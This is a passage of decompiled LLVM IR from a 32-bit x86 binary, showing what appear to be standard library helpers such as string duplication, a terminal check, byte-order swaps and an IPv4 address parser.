  %v2_804d318 = sub nsw i32 %v6_804d30d, %v6_804d314
  %v12_804d318 = icmp eq i32 %v2_804d318, 0
  store i32 %v2_804d318, i32* @edx, align 4
  %v1_804d31c = icmp eq i1 %v12_804d318, false
  br i1 %v1_804d31c, label %dec_label_pc_804d327, label %dec_label_pc_804d31e

dec_label_pc_804d31e:                             ; preds = %dec_label_pc_804d306, %dec_label_pc_804d30a
  %v0_804d3298 = phi i32 [ %v2_804d318, %dec_label_pc_804d30a ], [ %v0_804d3297, %dec_label_pc_804d306 ]
  %v2_804d31e = load i8, i8* %.pre, align 1
  %v3_804d31e = icmp eq i8 %v2_804d31e, 0
  br i1 %v3_804d31e, label %dec_label_pc_804d327, label %dec_label_pc_804d323

dec_label_pc_804d323:                             ; preds = %dec_label_pc_804d31e
  %v1_804d323 = add i32 %v0_804d323, 1
  %v1_804d324 = add i32 %v0_804d324, 1
  store i32 %v1_804d324, i32* @ecx, align 4
  br label %dec_label_pc_804d306

dec_label_pc_804d327:                             ; preds = %dec_label_pc_804d31e, %dec_label_pc_804d30a
  %v0_804d329 = phi i32 [ %v0_804d3298, %dec_label_pc_804d31e ], [ %v2_804d318, %dec_label_pc_804d30a ]
  ret i32 %v0_804d329

; uselistorder directives
  uselistorder i32 %v1_804d324, { 1, 0 }
  uselistorder i32 %v0_804d3298, { 1, 0 }
  uselistorder i32 %v2_804d318, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d324, { 2, 1, 0 }
  uselistorder i32 %v0_804d323, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d31e, { 1, 0 }
}

define i32 @function_804d32c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d32c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d32c = load i32, i32* @edi, align 4
  %v0_804d32d = load i32, i32* @esi, align 4
  %v0_804d32e = load i32, i32* @ebx, align 4
  store i32 %v0_804d32e, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d337 = inttoptr i32 %arg1 to i8*
  %v2_804d337 = call i32 @function_804d1ac(i8* %v1_804d337)
  %v1_804d33c = add i32 %v2_804d337, 1
  store i32 %v1_804d33c, i32* @esi, align 4
  %v1_804d342 = call i32 @function_804da52(i32 %v1_804d33c)
  store i32 %v1_804d342, i32* %ebx.global-to-local, align 4
  %v1_804d34c = icmp eq i32 %v1_804d342, 0
  br i1 %v1_804d34c, label %dec_label_pc_804d35c, label %dec_label_pc_804d350

dec_label_pc_804d350:                             ; preds = %dec_label_pc_804d32c
  %v0_804d351 = load i32, i32* @esi, align 4
  %v0_804d352 = load i32, i32* @edi, align 4
  %v3_804d354 = inttoptr i32 %v1_804d342 to i16*
  %v4_804d354 = call i32 @function_804d150(i16* %v3_804d354, i32 %v0_804d352, i32 %v0_804d351)
  %v0_804d35c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d35c

dec_label_pc_804d35c:                             ; preds = %dec_label_pc_804d32c, %dec_label_pc_804d350
  %v0_804d35c = phi i32 [ 0, %dec_label_pc_804d32c ], [ %v0_804d35c.pre, %dec_label_pc_804d350 ]
  %v2_804d35e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d35e, i32* @ebx, align 4
  store i32 %v0_804d32d, i32* @esi, align 4
  store i32 %v0_804d32c, i32* @edi, align 4
  ret i32 %v0_804d35c

; uselistorder directives
  uselistorder i32 %v1_804d342, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d35c, { 1, 0 }
}

define i32 @function_804d380(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d380:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d38c = call i32 @function_804d3a0(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d391 = icmp eq i32 %v3_804d38c, 0
  %v1_804d393 = zext i1 %v1_804d391 to i32
  ret i32 %v1_804d393
}

define i32 @function_804d3a0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804d3a0:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d3a0 = load i32, i32* @esi, align 4
  %v0_804d3a1 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3a1, i32* %stack_var_-8, align 4
  %v2_804d3a5 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d3a5, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d3b7 = call i32 @function_804b61c(i32 %arg1, i32 21505, i32 %v2_804d3a5)
  store i32 %v3_804d3b7, i32* %eax.global-to-local, align 4
  store i32 %v3_804d3b7, i32* @esi, align 4
  %v1_804d3c1 = icmp eq i32 %v3_804d3b7, 0
  %v1_804d3c3 = icmp eq i1 %v1_804d3c1, false
  br i1 %v1_804d3c3, label %dec_label_pc_804d408, label %dec_label_pc_804d3c5

dec_label_pc_804d3c5:                             ; preds = %dec_label_pc_804d3a0
  %v3_804d3c5 = load i32, i32* %stack_var_-44, align 4
  %v1_804d3c9 = load i32, i32* @ebx, align 4
  %v2_804d3c9 = inttoptr i32 %v1_804d3c9 to i32*
  store i32 %v3_804d3c5, i32* %v2_804d3c9, align 4
  %v1_804d3cf = load i32, i32* @ebx, align 4
  %v2_804d3cf = add i32 %v1_804d3cf, 4
  %v3_804d3cf = inttoptr i32 %v2_804d3cf to i32*
  %v1_804d3d6 = load i32, i32* @ebx, align 4
  %v2_804d3d6 = add i32 %v1_804d3d6, 8
  %v3_804d3d6 = inttoptr i32 %v2_804d3d6 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d3dd = load i32, i32* @ebx, align 4
  %v2_804d3dd = add i32 %v1_804d3dd, 12
  %v3_804d3dd = inttoptr i32 %v2_804d3dd to i32*
  store i32 %tmp3, i32* %v3_804d3dd, align 4
  %v4_804d3e0 = zext i8 %tmp to i32
  %v5_804d3e0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d3e0 = and i32 %v5_804d3e0, -256
  %v7_804d3e0 = or i32 %v6_804d3e0, %v4_804d3e0
  store i32 %v7_804d3e0, i32* %eax.global-to-local, align 4
  %v2_804d3e4 = load i32, i32* @ebx, align 4
  %v3_804d3e4 = add i32 %v2_804d3e4, 16
  %v4_804d3e4 = inttoptr i32 %v3_804d3e4 to i8*
  store i8 %tmp, i8* %v4_804d3e4, align 1
  %v0_804d3e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d3ea = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d3ef = load i32, i32* @ebx, align 4
  %v1_804d3ef = add i32 %v0_804d3ef, 17
  store i32 %v1_804d3ef, i32* %eax.global-to-local, align 4
  %v4_804d3f3 = call i32 @function_8050674(i32 %v1_804d3ef, i32 %v2_804d3ea, i32 19, i32 %v0_804d3e7)
  store i32 %v4_804d3f3, i32* %eax.global-to-local, align 4
  %v3_804d400 = inttoptr i32 %v4_804d3f3 to i8*
  %v4_804d400 = call i32 @function_804d178(i8* %v3_804d400, i32 0, i32 13)
  store i32 %v4_804d400, i32* %eax.global-to-local, align 4
  %v0_804d408.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d408

dec_label_pc_804d408:                             ; preds = %dec_label_pc_804d3a0, %dec_label_pc_804d3c5
  %v0_804d408 = phi i32 [ %v3_804d3b7, %dec_label_pc_804d3a0 ], [ %v0_804d408.pre, %dec_label_pc_804d3c5 ]
  store i32 %v0_804d408, i32* %eax.global-to-local, align 4
  %v2_804d40d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d40d, i32* @ebx, align 4
  store i32 %v0_804d3a0, i32* @esi, align 4
  ret i32 %v0_804d408

; uselistorder directives
  uselistorder i32 %v0_804d408, { 1, 0 }
  uselistorder i32 %v3_804d3b7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d408, { 1, 0 }
}

define i32 @function_804d410(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d410:
  %v1_804d414 = trunc i32 %arg1 to i16
  %v2_804d414 = call i16 @llvm.bswap.i16(i16 %v1_804d414)
  %v3_804d414 = zext i16 %v2_804d414 to i32
  ret i32 %v3_804d414
}

define i32 @function_804d41c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d41c:
  %v1_804d420 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d420
}

define i32 @function_804d423(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d423:
  %v1_804d427 = trunc i32 %arg1 to i16
  %v2_804d427 = call i16 @llvm.bswap.i16(i16 %v1_804d427)
  %v3_804d427 = zext i16 %v2_804d427 to i32
  ret i32 %v3_804d427
}

define i32 @function_804d42f(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d42f:
  %v1_804d433 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d433
}

define i32 @function_804d438(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d438:
  %v4_804d43f = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d452

dec_label_pc_804d452:                             ; preds = %dec_label_pc_804d4fa, %dec_label_pc_804d438
  %v3_804d4e3 = phi i32 [ 0, %dec_label_pc_804d438 ], [ %v5_804d4e8, %dec_label_pc_804d4fa ]
  %v2_804d4f1 = phi i32 [ 0, %dec_label_pc_804d438 ], [ %v3_804d4f1, %dec_label_pc_804d4fa ]
  %v0_804d460 = phi i32 [ %v4_804d43f, %dec_label_pc_804d438 ], [ %v1_804d4fa, %dec_label_pc_804d4fa ]
  %v1_804d452 = inttoptr i32 %v0_804d460 to i8*
  %v2_804d452 = load i8, i8* %v1_804d452, align 1
  %v8_804d452 = icmp eq i8 %v2_804d452, 48
  br i1 %v8_804d452, label %dec_label_pc_804d460, label %dec_label_pc_804d457

dec_label_pc_804d457:                             ; preds = %dec_label_pc_804d452
  br label %dec_label_pc_804d47f

dec_label_pc_804d460:                             ; preds = %dec_label_pc_804d452
  %v1_804d460 = add i32 %v0_804d460, 1
  %v1_804d461 = inttoptr i32 %v1_804d460 to i8*
  %v2_804d461 = load i8, i8* %v1_804d461, align 1
  %v3_804d461 = zext i8 %v2_804d461 to i32
  %v4_804d461 = load i32, i32* @eax, align 4
  %v5_804d461 = and i32 %v4_804d461, -256
  %v6_804d461 = or i32 %v5_804d461, %v3_804d461
  store i32 %v6_804d461, i32* @eax, align 4
  %v10_804d463 = icmp eq i8 %v2_804d461, 120
  br i1 %v10_804d463, label %dec_label_pc_804d477, label %dec_label_pc_804d467

dec_label_pc_804d467:                             ; preds = %dec_label_pc_804d460
  %v10_804d467 = icmp eq i8 %v2_804d461, 88
  br i1 %v10_804d467, label %dec_label_pc_804d477, label %dec_label_pc_804d46b

dec_label_pc_804d46b:                             ; preds = %dec_label_pc_804d467
  br label %dec_label_pc_804d47f

dec_label_pc_804d477:                             ; preds = %dec_label_pc_804d467, %dec_label_pc_804d460
  %v1_804d477 = add i32 %v0_804d460, 2
  br label %dec_label_pc_804d47f

dec_label_pc_804d47f:                             ; preds = %dec_label_pc_804d46b, %dec_label_pc_804d457, %dec_label_pc_804d477
  %v0_804d4d34 = phi i32 [ %v1_804d460, %dec_label_pc_804d46b ], [ %v0_804d460, %dec_label_pc_804d457 ], [ %v1_804d477, %dec_label_pc_804d477 ]
  %v0_804d4d913 = phi i32 [ 1, %dec_label_pc_804d46b ], [ 0, %dec_label_pc_804d457 ], [ 0, %dec_label_pc_804d477 ]
  %v0_804d4a810 = phi i32 [ 8, %dec_label_pc_804d46b ], [ 10, %dec_label_pc_804d457 ], [ 16, %dec_label_pc_804d477 ]
  %v4_804d4d3.pre = load i32, i32* @edx, align 4
  %v1_804d4d338 = inttoptr i32 %v0_804d4d34 to i8*
  %v2_804d4d339 = load i8, i8* %v1_804d4d338, align 1
  %v3_804d4d340 = zext i8 %v2_804d4d339 to i32
  %v5_804d4d341 = and i32 %v4_804d4d3.pre, -256
  %v6_804d4d342 = or i32 %v3_804d4d340, %v5_804d4d341
  store i32 %v6_804d4d342, i32* @edx, align 4
  %v4_804d4d543 = icmp eq i8 %v2_804d4d339, 0
  %v1_804d4d744 = icmp eq i1 %v4_804d4d543, false
  br i1 %v1_804d4d744, label %dec_label_pc_804d483.lr.ph, label %dec_label_pc_804d4d9

dec_label_pc_804d483.lr.ph:                       ; preds = %dec_label_pc_804d47f
  %v6_804d4a8 = icmp eq i32 %v0_804d4a810, 16
  %v1_804d4ab = icmp eq i1 %v6_804d4a8, false
  %v9_804d493 = icmp eq i32 %v0_804d4a810, 8
  %v1_804d496 = icmp eq i1 %v9_804d493, false
  br label %dec_label_pc_804d483

dec_label_pc_804d483:                             ; preds = %dec_label_pc_804d483.lr.ph, %dec_label_pc_804d4cd
  %v6_804d4d350 = phi i32 [ %v6_804d4d342, %dec_label_pc_804d483.lr.ph ], [ %v6_804d4d3, %dec_label_pc_804d4cd ]
  %v3_804d4d349 = phi i32 [ %v3_804d4d340, %dec_label_pc_804d483.lr.ph ], [ %v3_804d4d3, %dec_label_pc_804d4cd ]
  %v2_804d4d348 = phi i8 [ %v2_804d4d339, %dec_label_pc_804d483.lr.ph ], [ %v2_804d4d3, %dec_label_pc_804d4cd ]
  %v0_804d4fa47 = phi i32 [ %v0_804d4d34, %dec_label_pc_804d483.lr.ph ], [ %v1_804d4cd, %dec_label_pc_804d4cd ]
  %v4_804d4e846 = phi i32 [ 0, %dec_label_pc_804d483.lr.ph ], [ %storemerge, %dec_label_pc_804d4cd ]
  %v0_804d4d945 = phi i32 [ %v0_804d4d913, %dec_label_pc_804d483.lr.ph ], [ 1, %dec_label_pc_804d4cd ]
  %v0_804d486 = load i32, i32* @global_var_8056080, align 128
  %v2_804d48b = mul nuw nsw i32 %v3_804d4d349, 2
  %v3_804d48b = add i32 %v0_804d486, %v2_804d48b
  %v4_804d48b = inttoptr i32 %v3_804d48b to i16*
  %v5_804d48b = load i16, i16* %v4_804d48b, align 2
  %v6_804d48b = zext i16 %v5_804d48b to i32
  store i32 %v6_804d48b, i32* @eax, align 4
  %v2_804d48f = and i16 %v5_804d48b, 8
  %v3_804d48f = icmp eq i16 %v2_804d48f, 0
  br i1 %v3_804d48f, label %dec_label_pc_804d4a8, label %dec_label_pc_804d493

dec_label_pc_804d493:                             ; preds = %dec_label_pc_804d483
  br i1 %v1_804d496, label %dec_label_pc_804d49d, label %dec_label_pc_804d498

dec_label_pc_804d498:                             ; preds = %dec_label_pc_804d493
  %tmp91 = icmp ult i8 %v2_804d4d348, 56
  br i1 %tmp91, label %dec_label_pc_804d49d, label %dec_label_pc_804d504

dec_label_pc_804d49d:                             ; preds = %dec_label_pc_804d498, %dec_label_pc_804d493
  %v4_804d49f = mul i32 %v4_804d4e846, %v0_804d4a810
  store i32 %v4_804d49f, i32* @eax, align 4
  %v2_804d4a2 = add i32 %v4_804d49f, -48
  %v3_804d4a2 = add i32 %v2_804d4a2, %v3_804d4d349
  br label %dec_label_pc_804d4c5

dec_label_pc_804d4a8:                             ; preds = %dec_label_pc_804d483
  br i1 %v1_804d4ab, label %dec_label_pc_804d4d9, label %dec_label_pc_804d4ad

dec_label_pc_804d4ad:                             ; preds = %dec_label_pc_804d4a8
  %v2_804d4ad = and i32 %v6_804d48b, 16
  %v3_804d4ad = icmp eq i32 %v2_804d4ad, 0
  br i1 %v3_804d4ad, label %dec_label_pc_804d4d9, label %dec_label_pc_804d4b1

dec_label_pc_804d4b1:                             ; preds = %dec_label_pc_804d4ad
  %v2_804d4bb = mul i32 %v4_804d4e846, 16
  store i32 0, i32* @eax, align 4
  %v3_804d4c1 = add i32 %v2_804d4bb, -87
  br label %dec_label_pc_804d4c5

dec_label_pc_804d4c5:                             ; preds = %dec_label_pc_804d49d, %dec_label_pc_804d4b1
  %v4_804d4d36 = phi i32 [ %v6_804d4d350, %dec_label_pc_804d49d ], [ %v2_804d4bb, %dec_label_pc_804d4b1 ]
  %storemerge = phi i32 [ %v3_804d4a2, %dec_label_pc_804d49d ], [ %v3_804d4c1, %dec_label_pc_804d4b1 ]
  %tmp92 = icmp ult i32 %storemerge, 256
  br i1 %tmp92, label %dec_label_pc_804d4cd, label %dec_label_pc_804d504

dec_label_pc_804d4cd:                             ; preds = %dec_label_pc_804d4c5
  %v1_804d4cd = add i32 %v0_804d4fa47, 1
  %v1_804d4d3 = inttoptr i32 %v1_804d4cd to i8*
  %v2_804d4d3 = load i8, i8* %v1_804d4d3, align 1
  %v3_804d4d3 = zext i8 %v2_804d4d3 to i32
  %v5_804d4d3 = and i32 %v4_804d4d36, -256
  %v6_804d4d3 = or i32 %v3_804d4d3, %v5_804d4d3
  store i32 %v6_804d4d3, i32* @edx, align 4
  %v4_804d4d5 = icmp eq i8 %v2_804d4d3, 0
  %v1_804d4d7 = icmp eq i1 %v4_804d4d5, false
  br i1 %v1_804d4d7, label %dec_label_pc_804d483, label %dec_label_pc_804d4d9.thread

dec_label_pc_804d4d9.thread:                      ; preds = %dec_label_pc_804d4cd
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4d9:                             ; preds = %dec_label_pc_804d4a8, %dec_label_pc_804d4ad, %dec_label_pc_804d47f
  %v0_804d4d9.lcssa = phi i32 [ %v0_804d4d913, %dec_label_pc_804d47f ], [ %v0_804d4d945, %dec_label_pc_804d4ad ], [ %v0_804d4d945, %dec_label_pc_804d4a8 ]
  %v4_804d4e8.lcssa = phi i32 [ 0, %dec_label_pc_804d47f ], [ %v4_804d4e846, %dec_label_pc_804d4ad ], [ %v4_804d4e846, %dec_label_pc_804d4a8 ]
  %v0_804d4fa.lcssa = phi i32 [ %v0_804d4d34, %dec_label_pc_804d47f ], [ %v0_804d4fa47, %dec_label_pc_804d4ad ], [ %v0_804d4fa47, %dec_label_pc_804d4a8 ]
  %v2_804d4d3.lcssa = phi i8 [ %v2_804d4d339, %dec_label_pc_804d47f ], [ %v2_804d4d348, %dec_label_pc_804d4ad ], [ %v2_804d4d348, %dec_label_pc_804d4a8 ]
  %v4_804d4d5.lcssa = phi i1 [ true, %dec_label_pc_804d47f ], [ false, %dec_label_pc_804d4ad ], [ false, %dec_label_pc_804d4a8 ]
  %v1_804d4d9 = icmp eq i32 %v0_804d4d9.lcssa, 0
  br i1 %v1_804d4d9, label %dec_label_pc_804d504, label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d9.thread, %dec_label_pc_804d4d9
  %v4_804d4d5.lcssa90 = phi i1 [ true, %dec_label_pc_804d4d9.thread ], [ %v4_804d4d5.lcssa, %dec_label_pc_804d4d9 ]
  %v2_804d4d3.lcssa89 = phi i8 [ %v2_804d4d3, %dec_label_pc_804d4d9.thread ], [ %v2_804d4d3.lcssa, %dec_label_pc_804d4d9 ]
  %v0_804d4fa.lcssa88 = phi i32 [ %v1_804d4cd, %dec_label_pc_804d4d9.thread ], [ %v0_804d4fa.lcssa, %dec_label_pc_804d4d9 ]
  %v4_804d4e8.lcssa87 = phi i32 [ %storemerge, %dec_label_pc_804d4d9.thread ], [ %v4_804d4e8.lcssa, %dec_label_pc_804d4d9 ]
  %v3_804d4dd = icmp eq i32 %v2_804d4f1, 0
  br i1 %v3_804d4dd, label %dec_label_pc_804d4e8, label %dec_label_pc_804d4e3

dec_label_pc_804d4e3:                             ; preds = %dec_label_pc_804d4dd
  %v5_804d4e3 = mul i32 %v3_804d4e3, 256
  br label %dec_label_pc_804d4e8

dec_label_pc_804d4e8:                             ; preds = %dec_label_pc_804d4dd, %dec_label_pc_804d4e3
  %v3_804d4e8 = phi i32 [ %v3_804d4e3, %dec_label_pc_804d4dd ], [ %v5_804d4e3, %dec_label_pc_804d4e3 ]
  %v5_804d4e8 = or i32 %v3_804d4e8, %v4_804d4e8.lcssa87
  %v10_804d4ec = icmp eq i8 %v2_804d4d3.lcssa89, 46
  %v1_804d4ef = icmp eq i1 %v10_804d4ec, false
  br i1 %v1_804d4ef, label %dec_label_pc_804d500, label %dec_label_pc_804d4f1

dec_label_pc_804d4f1:                             ; preds = %dec_label_pc_804d4e8
  %v11_804d4f4 = icmp eq i32 %v2_804d4f1, 3
  br i1 %v11_804d4f4, label %dec_label_pc_804d504, label %dec_label_pc_804d4fa

dec_label_pc_804d4fa:                             ; preds = %dec_label_pc_804d4f1
  %v3_804d4f1 = add i32 %v2_804d4f1, 1
  %v1_804d4fa = add i32 %v0_804d4fa.lcssa88, 1
  br label %dec_label_pc_804d452

dec_label_pc_804d500:                             ; preds = %dec_label_pc_804d4e8
  br i1 %v4_804d4d5.lcssa90, label %dec_label_pc_804d50c, label %dec_label_pc_804d504

dec_label_pc_804d504:                             ; preds = %dec_label_pc_804d4f1, %dec_label_pc_804d4d9, %dec_label_pc_804d4c5, %dec_label_pc_804d498, %dec_label_pc_804d500
  br label %dec_label_pc_804d50c

dec_label_pc_804d50c:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d504
  %v3_804d50c = phi i32 [ %v5_804d4e8, %dec_label_pc_804d500 ], [ -1, %dec_label_pc_804d504 ]
  ret i32 %v3_804d50c

; uselistorder directives
  uselistorder i32 %v5_804d4e8, { 1, 0 }
  uselistorder i32 %v6_804d4d3, { 1, 0 }
  uselistorder i32 %v3_804d4d3, { 1, 0 }
  uselistorder i8 %v2_804d4d3, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v4_804d49f, { 1, 0 }
  uselistorder i32 %v4_804d4e846, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804d4a810, { 0, 2, 1 }
  uselistorder i32 %v0_804d460, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d4f1, { 1, 0, 2 }
  uselistorder i32 %v3_804d4e3, { 1, 0 }
  uselistorder label %dec_label_pc_804d50c, { 1, 0 }
  uselistorder label %dec_label_pc_804d504, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d4e8, { 1, 0 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d4c5, { 1, 0 }
  uselistorder label %dec_label_pc_804d483, { 1, 0 }
  uselistorder label %dec_label_pc_804d47f, { 2, 0, 1 }
}

define i32 @function_804d518(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d518:
  %stack_var_-4 = alloca i32, align 4
  %v2_804d51b = ptrtoint i32* %stack_var_-4 to i32
  %v2_804d524 = inttoptr i32 %arg1 to i8*
  %v3_804d524 = call i32 @function_80507cc(i8* %v2_804d524, i32 %v2_804d51b)
  store i32 -1, i32* @edx, align 4
  %v1_804d52f = icmp eq i32 %v3_804d524, 0
  br i1 %v1_804d52f, label %dec_label_pc_804d537, label %dec_label_pc_804d533

dec_label_pc_804d533:                             ; preds = %dec_label_pc_804d518
  %v3_804d533 = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804d533, i32* @edx, align 4
  br label %dec_label_pc_804d537

dec_label_pc_804d537:                             ; preds = %dec_label_pc_804d518, %dec_label_pc_804d533
  %v0_804d537 = phi i32 [ -1, %dec_label_pc_804d518 ], [ %v3_804d533, %dec_label_pc_804d533 ]
  ret i32 %v0_804d537

; uselistorder directives
  uselistorder label %dec_label_pc_804d537, { 1, 0 }
}

define i32 @function_804d540(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d540:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d543 = call i32 @function_804fae4()
  %v0_804d548 = load i32, i32* @edx, align 4
  %v2_804d54b = ptrtoint i32* %stack_var_-4 to i32
  %v9_804d563 = call i32 @function_804d570(i32 %arg1, i32* nonnull @global_var_805872c.136, i32 ptrtoint (i32* @global_var_8058560.135 to i32), i32 460, i32 %v2_804d54b, i32 %v0_804d543, i32 %v0_804d548, i32 %v0_804d548)
  %v3_804d568 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804d568
}

define i32 @function_804d570(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804d570:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804d570 = load i32, i32* @ebp, align 4
  %v0_804d571 = load i32, i32* @edi, align 4
  %v0_804d572 = load i32, i32* @esi, align 4
  %v0_804d573 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804d583 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804d583, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804d58e = icmp eq i32 %arg1, 0
  br i1 %v4_804d58e, label %dec_label_pc_804d89a, label %dec_label_pc_804d599

dec_label_pc_804d599:                             ; preds = %dec_label_pc_804d570
  %v1_804d599 = call i32 @function_804b774(i32 %v0_804d573)
  store i32 %v1_804d599, i32* %eax.global-to-local, align 4
  store i32 %v1_804d599, i32* @esi, align 4
  %v1_804d5a0 = inttoptr i32 %v1_804d599 to i32*
  %v2_804d5a0 = load i32, i32* %v1_804d5a0, align 4
  store i32 %v2_804d5a0, i32* @edi, align 4
  store i32 0, i32* %v1_804d5a0, align 4
  %v0_804d5b1 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5b1, i32* %stack_var_-108, align 4
  %v7_804d5bd = call i32 @function_80511f8(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804d5b1, i32 %arg5, i32 %arg6, i32 %v1_804d599)
  store i32 %v7_804d5bd, i32* %eax.global-to-local, align 4
  %v1_804d5c5 = icmp eq i32 %v7_804d5bd, 0
  br i1 %v1_804d5c5, label %dec_label_pc_804d89a, label %dec_label_pc_804d5cd

dec_label_pc_804d5cd:                             ; preds = %dec_label_pc_804d599
  %v1_804d5d1 = inttoptr i32 %arg6 to i32*
  %v2_804d5d1 = load i32, i32* %v1_804d5d1, align 4
  store i32 %v2_804d5d1, i32* %edx.global-to-local, align 4
  %v9_804d5d3 = icmp eq i32 %v2_804d5d1, 1
  br i1 %v9_804d5d3, label %dec_label_pc_804d5ed, label %dec_label_pc_804d5d8

dec_label_pc_804d5d8:                             ; preds = %dec_label_pc_804d5cd
  %v9_804d5d8 = icmp eq i32 %v2_804d5d1, 4
  br i1 %v9_804d5d8, label %dec_label_pc_804d5ed, label %dec_label_pc_804d5dd

dec_label_pc_804d5dd:                             ; preds = %dec_label_pc_804d5d8
  %v1_804d5dd = add i32 %v2_804d5d1, 1
  %v8_804d5dd = icmp eq i32 %v1_804d5dd, 0
  store i32 %v1_804d5dd, i32* %edx.global-to-local, align 4
  %v1_804d5de = icmp eq i1 %v8_804d5dd, false
  br i1 %v1_804d5de, label %dec_label_pc_804d89a, label %dec_label_pc_804d5e4

dec_label_pc_804d5e4:                             ; preds = %dec_label_pc_804d5dd
  %v0_804d5e4 = load i32, i32* @esi, align 4
  %v1_804d5e4 = inttoptr i32 %v0_804d5e4 to i32*
  %v2_804d5e4 = load i32, i32* %v1_804d5e4, align 4
  %v11_804d5e4 = icmp eq i32 %v2_804d5e4, 2
  %v1_804d5e7 = icmp eq i1 %v11_804d5e4, false
  br i1 %v1_804d5e7, label %dec_label_pc_804d89a, label %dec_label_pc_804d5ed

dec_label_pc_804d5ed:                             ; preds = %dec_label_pc_804d5e4, %dec_label_pc_804d5d8, %dec_label_pc_804d5cd
  %v0_804d5ed = load i32, i32* @ebp, align 4
  store i32 %v0_804d5ed, i32* %eax.global-to-local, align 4
  %v0_804d5ef = load i32, i32* @edi, align 4
  %v1_804d5ef = load i32, i32* @esi, align 4
  %v2_804d5ef = inttoptr i32 %v1_804d5ef to i32*
  store i32 %v0_804d5ef, i32* %v2_804d5ef, align 4
  %v0_804d5f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d5f1 = sub i32 0, %v0_804d5f1
  %v1_804d5f3 = urem i32 %v1_804d5f1, 4
  %v2_804d5f3 = icmp eq i32 %v1_804d5f3, 0
  store i32 %v1_804d5f3, i32* %eax.global-to-local, align 4
  %v0_804d608.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804d5f3, label %dec_label_pc_804d604, label %dec_label_pc_804d5f8

dec_label_pc_804d5f8:                             ; preds = %dec_label_pc_804d5ed
  %v2_804d5f8 = sub i32 %v0_804d608.pre, %v1_804d5f3
  %v7_804d5f8 = icmp ult i32 %v0_804d608.pre, %v1_804d5f3
  br i1 %v7_804d5f8, label %dec_label_pc_804d895, label %dec_label_pc_804d600

dec_label_pc_804d600:                             ; preds = %dec_label_pc_804d5f8
  %v0_804d600 = load i32, i32* @ebp, align 4
  %v2_804d600 = add i32 %v0_804d600, %v1_804d5f3
  store i32 %v2_804d600, i32* @ebp, align 4
  store i32 %v2_804d5f8, i32* @ebx, align 4
  br label %dec_label_pc_804d604

dec_label_pc_804d604:                             ; preds = %dec_label_pc_804d5ed, %dec_label_pc_804d600
